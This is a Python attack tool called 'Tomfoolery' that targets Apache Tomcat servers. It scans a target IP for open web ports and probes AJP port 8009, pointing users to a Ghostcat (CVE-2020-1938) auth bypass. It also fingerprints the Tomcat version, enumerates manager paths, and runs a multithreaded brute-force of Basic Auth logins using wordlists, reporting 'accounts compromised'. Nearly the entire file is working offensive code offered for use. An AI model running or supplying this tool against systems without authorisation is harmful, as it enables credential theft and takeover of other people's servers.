import requests
import threading
import socket
import re
import sys
import os
from queue import Queue
from tqdm import tqdm

# --- CONFIGURATION ---
COMMON_WEB_PORTS = [80, 81, 8080, 8000, 8081, 8443, 8888, 9090, 9443]
DEFAULT_TOMCAT_PATHS = ["/manager/html", "/manager/status", "/host-manager/html"]
DEFAULT_USERS = ["tomcat", "admin", "manager", "root", "both", "role1"]
MAX_THREADS = 10  # Slightly increased for faster directory busting
TIMEOUT = 3

# Disable insecure request warnings for HTTPS targets
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_port(ip, port, open_ports):
    """Fast socket scanner to identify open ports."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
    except: pass

def check_ajp(ip):
    """Checks specifically for AJP (Port 8009)."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.5)
            if s.connect_ex((ip, 8009)) == 0:
                return True
    except: pass
    return False

def get_tomcat_version(ip, port):
    """Identifies Tomcat version by forcing a 404 error page."""
    base_url = f"http://{ip}:{port}"
    try:
        r = requests.get(f"{base_url}/invalid_path_9999_version_check", timeout=TIMEOUT, verify=False)
        match = re.search(r"Apache Tomcat/\d+\.\d+\.\d+", r.text)
        if match:
            return match.group(0)
    except: pass
    return "Unknown"

class PathDiscoveryEngine:
    """Threaded engine for directory enumeration to prevent CPU/Socket exhaustion."""
    def __init__(self, base_url, paths):
        self.base_url = base_url
        self.paths = paths
        self.queue = Queue(maxsize=2000)
        self.auth_required = []
        self.no_auth = []
        self.pbar = None

    def worker(self):
        session = requests.Session()
        while True:
            path = self.queue.get()
            if path is None:
                self.queue.task_done()
                break
            
            clean_path = path if path.startswith('/') else '/' + path
            url = f"{self.base_url}{clean_path}"
            
            try:
                # allow_redirects=False prevents us from following logins to other pages
                r = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=False)
                
                if r.status_code == 401:
                    auth_header = r.headers.get('WWW-Authenticate', '')
                    if 'Tomcat' in auth_header or 'Basic realm' in auth_header:
                        tqdm.write(f"[+] Found Login Path: {url}")
                        self.auth_required.append(url)
                        
                elif r.status_code == 200:
                    tqdm.write(f"[!] Found Open Path (No Login Required): {url}")
                    self.no_auth.append(url)
            except: pass
            
            self.pbar.update(1)
            self.queue.task_done()

    def run(self):
        self.pbar = tqdm(total=len(self.paths), desc=f"Scanning Paths on {self.base_url}", unit="req", dynamic_ncols=True)
        
        threads = []
        for _ in range(MAX_THREADS):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        for path in self.paths:
            self.queue.put(path)
            
        for _ in range(MAX_THREADS):
            self.queue.put(None)
            
        self.queue.join()
        self.pbar.close()
        return self.auth_required, self.no_auth

class BruteForceEngine:
    """Threaded engine for brute-forcing Basic Auth."""
    def __init__(self, url, u_list, p_file, total):
        self.url = url
        self.u_list = u_list
        self.p_file = p_file
        self.total = total
        self.queue = Queue(maxsize=2000)
        self.found_accounts = []
        self.pbar = None

    def worker(self):
        session = requests.Session()
        while True:
            task = self.queue.get()
            if task is None:
                self.queue.task_done()
                break
            
            user, pwd = task
            try:
                r = session.get(self.url, auth=(user, pwd), timeout=TIMEOUT, verify=False)
                if r.status_code == 200:
                    tqdm.write(f"\n[$$$] LETHAL HIT: Valid Credentials Found -> User: '{user}' | Pass: '{pwd}'")
                    self.found_accounts.append((user, pwd))
            except: pass
            
            self.pbar.update(1)
            self.queue.task_done()

    def producer(self):
        with open(self.p_file, 'r', errors='ignore') as pf:
            for line in pf:
                p = line.strip()
                if not p: continue
                if ':' in p:
                    parts = p.split(':', 1)
                    self.queue.put((parts[0], parts[1]))
                else:
                    for u in self.u_list:
                        self.queue.put((u, p))
        for _ in range(MAX_THREADS):
            self.queue.put(None)

    def run(self):
        self.pbar = tqdm(total=self.total, desc=f"Brute Forcing", unit="req", dynamic_ncols=True)
        
        threads = []
        for _ in range(MAX_THREADS):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
            
        prod = threading.Thread(target=self.producer)
        prod.daemon = True
        prod.start()
            
        self.queue.join()
        self.pbar.close()
        return self.found_accounts

def main():
    print("=== Tomfoolery - Tomcat Recon and Brute Forcer ===")
    target = input("Target IP: ").strip()
    path_list_path = input("Tomcat paths wordlist (Leave blank for defaults): ").strip()
    u_list_path = input("Username wordlist path (Leave blank for defaults): ").strip()
    p_list_path = input("Password wordlist path: ").strip()

    if not p_list_path:
        print("\n[-] Error: A password wordlist is strictly required. Exiting.")
        sys.exit(1)

    # Process Paths Wordlist
    paths_to_check = DEFAULT_TOMCAT_PATHS
    if path_list_path:
        if not os.path.exists(path_list_path):
            print(f"\n[-] Error: Path wordlist '{path_list_path}' not found. Exiting.")
            sys.exit(1)
        try:
            with open(path_list_path, 'r', errors='ignore') as pf:
                paths_to_check = [line.strip() for line in pf if line.strip() and not line.startswith('#')]
            if not paths_to_check:
                print(f"\n[-] Error: Path wordlist '{path_list_path}' is empty. Exiting.")
                sys.exit(1)
            print(f"\n[+] Loaded {len(paths_to_check)} custom paths to scan.")
        except Exception as e:
            print(f"\n[-] Error reading path wordlist: {e}")
            sys.exit(1)
    else:
        print(f"\n[+] Using default Tomcat paths ({len(paths_to_check)}).")

    # --- PHASE 1: Discovery ---
    print("\n[*] Phase 1: Discovering Open Web Ports...")
    open_ports = []
    threads = []
    for port in COMMON_WEB_PORTS:
        t = threading.Thread(target=check_port, args=(target, port, open_ports))
        t.start()
        threads.append(t)
    for t in threads: t.join()

    if not open_ports:
        print("[-] No common web ports open. Exiting.")
        sys.exit(0)
    print(f"[+] Open web ports identified: {open_ports}")

    # --- PHASE 2: AJP & Protocol Bypass ---
    print("\n[*] Phase 2: Checking AJP (Port 8009) for Ghostcat...")
    if check_ajp(target):
        print("[!!!] WARNING: AJP Port 8009 is OPEN.")
        print("    -> Target is likely vulnerable to Ghostcat (CVE-2020-1938).")
        print("    -> You can bypass auth entirely using AJP file inclusion.")
    else:
        print("[-] Port 8009 Closed. AJP Bypass not possible.")

    # --- PHASE 3: Threaded Enumeration ---
    print("\n[*] Phase 3: Enumerating Paths & Checking Auth Requirements...")
    brute_force_targets = []
    
    for port in open_ports:
        base_url = f"http://{target}:{port}"
        version = get_tomcat_version(target, port)
        print(f"\n[*] Scanning {base_url} (Detected Version: {version})")
        
        scanner = PathDiscoveryEngine(base_url, paths_to_check)
        try:
            auth_req, open_paths = scanner.run()
        except KeyboardInterrupt:
            print("\n[!] Path scan interrupted by user.")
            sys.exit(0)
            
        if open_paths:
            print(f"\n    [!] Non-Login Accessible Paths (Check these manually!):")
            for p in open_paths: print(f"        -> {p}")
            
        if auth_req:
            print(f"\n    [+] Login-Required Paths (Forwarding to Brute Force):")
            for p in auth_req: 
                print(f"        -> {p}")
                brute_force_targets.append(p)

    if not brute_force_targets:
        print("\n[-] No accessible paths requiring login were found. Nothing to brute force. Exiting.")
        sys.exit(0)

    # --- PHASE 4: Credential Processing ---
    print(f"\n[*] Phase 4: Loading Credential Wordlists...")
    
    users = DEFAULT_USERS
    if u_list_path:
        if not os.path.exists(u_list_path):
            print(f"[-] Error: Username file '{u_list_path}' not found. Exiting.")
            sys.exit(1)
        with open(u_list_path, 'r', errors='ignore') as uf:
            users = [line.strip() for line in uf if line.strip()]
        print(f"[+] Loaded {len(users)} custom usernames.")
    else:
        print(f"[+] Using default targeted users ({len(users)}).")

    if not os.path.exists(p_list_path):
        print(f"[-] Error: Password file '{p_list_path}' not found. Exiting.")
        sys.exit(1)
        
    total_creds = 0
    with open(p_list_path, 'r', errors='ignore') as pf:
        for line in pf:
            p = line.strip()
            if not p: continue
            if ':' in p:
                total_creds += 1
            else:
                total_creds += len(users)
                
    if total_creds == 0:
        print(f"[-] Error: Password file '{p_list_path}' is empty. Exiting.")
        sys.exit(1)
        
    print(f"[+] Wordlists successfully processed. Total combinations to test per path: {total_creds}")

    # --- PHASE 5: Brute Force ---
    print("\n[*] Phase 5: Executing Brute Force Attack on Login Paths...")
    for target_url in brute_force_targets:
        print(f"\n[*] Targeting: {target_url}")
        engine = BruteForceEngine(target_url, users, p_list_path, total_creds)
        try:
            results = engine.run()
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user.")
            sys.exit(0)
            
        if results:
            print(f"\n[+] Finished attack on {target_url}. Total accounts compromised: {len(results)}")
        else:
            print(f"\n[-] Finished attack on {target_url}. No credentials found.")

if __name__ == "__main__":
    main()
